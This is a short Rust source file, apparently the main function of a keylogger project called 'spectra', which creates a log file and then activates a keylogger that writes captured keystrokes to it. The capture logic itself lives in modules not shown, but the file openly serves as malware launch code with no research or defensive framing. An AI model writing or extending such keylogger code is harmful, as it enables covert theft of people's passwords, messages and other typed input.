use spectra::components::{keylogger,filecreator};

fn main() {
    let file = filecreator::filehandler().unwrap();
    keylogger::activate_keylogger(file);
}